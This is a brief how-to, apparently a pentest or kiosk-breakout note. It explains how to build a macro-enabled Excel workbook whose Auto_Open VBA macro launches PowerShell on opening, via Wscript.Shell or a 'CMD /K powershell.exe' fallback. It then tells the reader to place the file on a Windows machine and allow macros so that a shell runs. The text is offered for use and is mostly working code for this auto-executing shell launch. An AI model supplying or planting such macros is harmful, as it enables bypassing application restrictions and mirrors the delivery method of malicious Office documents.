File > Options > Customize Ribbon 

Ensure Developer is Checked

Create a new xlsm and then go to Developer (ribbon/menu)

Click Visual Basic

Insert (menu) > Module

Paste this one if Wscript.Shell can work

```vba
Sub Auto_Open()
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run ("powershell -noexit")
End Sub
```

If Wscript does not work try

```vba
Sub Auto_Open()
    Shell "CMD /K powershell.exe", vbNormalFocus
End Sub
```
Save your VBA and your xlsm file

Drop them on your windows box, open them, allow macros and then powershell (or whatever exe you can access) should execute.
